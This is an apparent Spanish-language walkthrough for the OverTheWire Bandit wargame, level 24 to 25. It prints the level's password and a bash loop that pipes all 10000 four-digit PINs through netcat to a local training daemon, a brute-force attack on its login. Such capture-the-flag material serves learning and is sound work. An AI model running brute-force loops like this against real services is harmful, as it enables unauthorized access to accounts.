# Bandit Nivel 24 -> Nivel 25

## Objetivo

Un demonio está escuchando en el puerto 30002 y dará la contraseña de bandit25 si se le proporciona la contraseña de bandit24 y un código PIN numérico de 4 dígitos.

No hay forma de recuperar el código PIN excepto revisando las 10000 combinaciones, llamadas brute-forcing.

No tienes que crear nuevas conexiones en cada momento. 

## Datos de acceso

	- Usuario: bandit24
	- Host: bandit.labs.overthewire.org
	- Puerto: 2220

## Comandos utilizados

```bash

ssh bandit24@bandit.labs.overthewire.org -p 2220

mktemp -d

touch /tmp/tmp.YoUmFeTlxG/pass.txt
chmod 777 pass.txt

for pin in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done | nc 127.0.0.1 30002 > pass.txt

grep "bandit25" pass.txt
